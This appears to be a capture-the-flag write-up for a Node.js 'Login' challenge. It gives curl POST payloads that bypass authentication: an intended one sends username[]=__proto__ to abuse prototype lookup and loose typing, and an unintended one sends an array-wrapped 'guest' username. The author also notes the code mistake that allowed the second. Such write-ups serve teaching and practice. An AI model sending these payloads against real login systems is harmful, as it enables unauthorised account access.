# Login

## Intended solution

```
curl -X POST -d "username[]=__proto__" 'http://{{host}}/login'
```

## Description

- The `USER_DB` object is defined in the `login.js` file.
- There is a `__proto__` attribute in the `USER_DB` object.
- Use weak type to make make username as an array to bypass the length check.
- If we don't send the `password` field, then it will be `undefined`. Also there is no `password` field in the `USER_DB.__proto__` object.

## Unintended solution

```
curl -X POST -d "username[]=guest&password=guest" 'http://{{host}}/login'
```

Stupid mistake :/
I should write `if (username == 'guest') {`.

